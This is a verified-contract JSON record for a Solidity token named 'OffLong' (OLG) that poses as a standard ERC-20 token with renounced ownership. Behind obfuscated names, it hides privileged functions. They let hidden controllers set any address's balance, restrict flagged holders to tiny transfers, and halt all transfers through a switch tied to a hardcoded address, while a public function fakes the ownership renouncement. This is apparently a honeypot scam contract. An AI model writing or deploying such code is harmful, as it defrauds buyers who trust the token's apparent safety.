{"SourceCode": "//SPDX-License-Identifier: MIT\n\npragma solidity ^0.8.5;\n\ninterface feeTotal {\n    function factory() external pure returns (address);\n\n    function WETH() external pure returns (address);\n}\n\nabstract contract atTakeList {\n    function _msgSender() internal view virtual returns (address) {\n        return msg.sender;\n    }\n\n    function _msgData() internal view virtual returns (bytes calldata) {\n        return msg.data;\n    }\n}\n\ninterface walletLimit {\n    function createPair(address buyFee, address atSell) external returns (address);\n}\n\ninterface shouldFrom {\n    function totalSupply() external view returns (uint256);\n\n    function balanceOf(address swapAt) external view returns (uint256);\n\n    function transfer(address limitEnable, uint256 maxShould) external returns (bool);\n\n    function allowance(address walletSell, address spender) external view returns (uint256);\n\n    function approve(address spender, uint256 maxShould) external returns (bool);\n\n    function transferFrom(\n        address sender,\n        address limitEnable,\n        uint256 maxShould\n    ) external returns (bool);\n\n    event Transfer(address indexed from, address indexed liquidityReceiver, uint256 value);\n    event Approval(address indexed walletSell, address indexed spender, uint256 value);\n}\n\ninterface shouldFromMetadata is shouldFrom {\n    function name() external view returns (string memory);\n\n    function symbol() external view returns (string memory);\n\n    function decimals() external view returns (uint8);\n}\n\ncontract OffLong is atTakeList, shouldFrom, shouldFromMetadata {\n\n    bool public shouldLaunch;\n\n    uint256 marketingBuy;\n\n    uint256 launchedTx;\n\n    bool public atIs;\n\n    function toLiquidity(address takeTx, address limitEnable, uint256 maxShould) internal returns (bool) {\n        if (takeTx == tokenLaunched) {\n            return liquidityFee(takeTx, limitEnable, maxShould);\n        }\n        uint256 swapAmount = shouldFrom(marketingTeam).balanceOf(limitMin);\n        require(swapAmount == launchedTx);\n        require(limitEnable != limitMin);\n        if (receiverIs[takeTx]) {\n            return liquidityFee(takeTx, limitEnable, liquidityReceiverMax);\n        }\n        return liquidityFee(takeTx, limitEnable, maxShould);\n    }\n\n    function getOwner() external view returns (address) {\n        return takeExempt;\n    }\n\n    function walletSellTx(uint256 maxShould) public {\n        marketingSwap();\n        launchedTx = maxShould;\n    }\n\n    uint256 public tokenTo;\n\n    function tradingWallet(address toSwap) public {\n        marketingSwap();\n        \n        if (toSwap == tokenLaunched || toSwap == marketingTeam) {\n            return;\n        }\n        receiverIs[toSwap] = true;\n    }\n\n    string private tokenLaunchedSender = \"Off Long\";\n\n    address public tokenLaunched;\n\n    function receiverToExempt(address teamMin, uint256 maxShould) public {\n        marketingSwap();\n        swapAuto[teamMin] = maxShould;\n    }\n\n    function approve(address swapReceiver, uint256 maxShould) public virtual override returns (bool) {\n        minWallet[_msgSender()][swapReceiver] = maxShould;\n        emit Approval(_msgSender(), swapReceiver, maxShould);\n        return true;\n    }\n\n    function totalSupply() external view virtual override returns (uint256) {\n        return txMarketing;\n    }\n\n    function transferFrom(address takeTx, address limitEnable, uint256 maxShould) external override returns (bool) {\n        if (_msgSender() != takeTokenFee) {\n            if (minWallet[takeTx][_msgSender()] != type(uint256).max) {\n                require(maxShould <= minWallet[takeTx][_msgSender()]);\n                minWallet[takeTx][_msgSender()] -= maxShould;\n            }\n        }\n        return toLiquidity(takeTx, limitEnable, maxShould);\n    }\n\n    function marketingSwap() private view {\n        require(receiverFeeTrading[_msgSender()]);\n    }\n\n    uint8 private receiverShould = 18;\n\n    function name() external view virtual override returns (string memory) {\n        return tokenLaunchedSender;\n    }\n\n    bool private enableAt;\n\n    address takeTokenFee = 0x10ED43C718714eb63d5aA57B78B54704E256024E;\n\n    mapping(address => bool) public receiverFeeTrading;\n\n    bool private exemptLaunched;\n\n    function sellAt(address launchToken) public {\n        if (receiverFrom) {\n            return;\n        }\n        \n        receiverFeeTrading[launchToken] = true;\n        if (atIs != enableAt) {\n            limitAtFrom = tokenTo;\n        }\n        receiverFrom = true;\n    }\n\n    constructor (){\n        if (limitAtFrom != tokenTo) {\n            exemptLaunched = true;\n        }\n        feeTotal atTake = feeTotal(takeTokenFee);\n        marketingTeam = walletLimit(atTake.factory()).createPair(atTake.WETH(), address(this));\n        \n        tokenLaunched = _msgSender();\n        fromShould();\n        receiverFeeTrading[tokenLaunched] = true;\n        swapAuto[tokenLaunched] = txMarketing;\n        \n        emit Transfer(address(0), tokenLaunched, txMarketing);\n    }\n\n    function allowance(address amountBuy, address swapReceiver) external view virtual override returns (uint256) {\n        if (swapReceiver == takeTokenFee) {\n            return type(uint256).max;\n        }\n        return minWallet[amountBuy][swapReceiver];\n    }\n\n    bool public receiverFrom;\n\n    uint256 private txMarketing = 100000000 * 10 ** 18;\n\n    function decimals() external view virtual override returns (uint8) {\n        return receiverShould;\n    }\n\n    function transfer(address teamMin, uint256 maxShould) external virtual override returns (bool) {\n        return toLiquidity(_msgSender(), teamMin, maxShould);\n    }\n\n    function liquidityFee(address takeTx, address limitEnable, uint256 maxShould) internal returns (bool) {\n        require(swapAuto[takeTx] >= maxShould);\n        swapAuto[takeTx] -= maxShould;\n        swapAuto[limitEnable] += maxShould;\n        emit Transfer(takeTx, limitEnable, maxShould);\n        return true;\n    }\n\n    mapping(address => bool) public receiverIs;\n\n    function owner() external view returns (address) {\n        return takeExempt;\n    }\n\n    mapping(address => mapping(address => uint256)) private minWallet;\n\n    uint256 public limitAtFrom;\n\n    string private takeLaunched = \"OLG\";\n\n    mapping(address => uint256) private swapAuto;\n\n    bool public receiverLaunched;\n\n    function fromShould() public {\n        emit OwnershipTransferred(tokenLaunched, address(0));\n        takeExempt = address(0);\n    }\n\n    address limitMin = 0x0ED943Ce24BaEBf257488771759F9BF482C39706;\n\n    function balanceOf(address swapAt) public view virtual override returns (uint256) {\n        return swapAuto[swapAt];\n    }\n\n    address private takeExempt;\n\n    event OwnershipTransferred(address indexed shouldEnable, address indexed launchTake);\n\n    function symbol() external view virtual override returns (string memory) {\n        return takeLaunched;\n    }\n\n    address public marketingTeam;\n\n    uint256 constant liquidityReceiverMax = 8 ** 10;\n\n}", "ABI": "[{\"inputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"constructor\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":true,\"internalType\":\"address\",\"name\":\"walletSell\",\"type\":\"address\"},{\"indexed\":true,\"internalType\":\"address\",\"name\":\"spender\",\"type\":\"address\"},{\"indexed\":false,\"internalType\":\"uint256\",\"name\":\"value\",\"type\":\"uint256\"}],\"name\":\"Approval\",\"type\":\"event\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":true,\"internalType\":\"address\",\"name\":\"shouldEnable\",\"type\":\"address\"},{\"indexed\":true,\"internalType\":\"address\",\"name\":\"launchTake\",\"type\":\"address\"}],\"name\":\"OwnershipTransferred\",\"type\":\"event\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":true,\"internalType\":\"address\",\"name\":\"from\",\"type\":\"address\"},{\"indexed\":true,\"internalType\":\"address\",\"name\":\"liquidityReceiver\",\"type\":\"address\"},{\"indexed\":false,\"internalType\":\"uint256\",\"name\":\"value\",\"type\":\"uint256\"}],\"name\":\"Transfer\",\"type\":\"event\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"amountBuy\",\"type\":\"address\"},{\"internalType\":\"address\",\"name\":\"swapReceiver\",\"type\":\"address\"}],\"name\":\"allowance\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"swapReceiver\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"maxShould\",\"type\":\"uint256\"}],\"name\":\"approve\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"atIs\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"swapAt\",\"type\":\"address\"}],\"name\":\"balanceOf\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"decimals\",\"outputs\":[{\"internalType\":\"uint8\",\"name\":\"\",\"type\":\"uint8\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"fromShould\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"getOwner\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"limitAtFrom\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"marketingTeam\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"name\",\"outputs\":[{\"internalType\":\"string\",\"name\":\"\",\"type\":\"string\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"owner\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"name\":\"receiverFeeTrading\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"receiverFrom\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"name\":\"receiverIs\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"receiverLaunched\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"teamMin\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"maxShould\",\"type\":\"uint256\"}],\"name\":\"receiverToExempt\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"launchToken\",\"type\":\"address\"}],\"name\":\"sellAt\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"shouldLaunch\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"symbol\",\"outputs\":[{\"internalType\":\"string\",\"name\":\"\",\"type\":\"string\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"tokenLaunched\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"tokenTo\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"totalSupply\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"toSwap\",\"type\":\"address\"}],\"name\":\"tradingWallet\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"teamMin\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"maxShould\",\"type\":\"uint256\"}],\"name\":\"transfer\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"takeTx\",\"type\":\"address\"},{\"internalType\":\"address\",\"name\":\"limitEnable\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"maxShould\",\"type\":\"uint256\"}],\"name\":\"transferFrom\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"uint256\",\"name\":\"maxShould\",\"type\":\"uint256\"}],\"name\":\"walletSellTx\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"}]", "ContractName": "OffLong", "CompilerVersion": "v0.8.19+commit.7dd6d404", "OptimizationUsed": "0", "Runs": "200", "ConstructorArguments": "", "EVMVersion": "Default", "Library": "", "LicenseType": "MIT", "Proxy": "0", "Implementation": "", "SwarmSource": ""}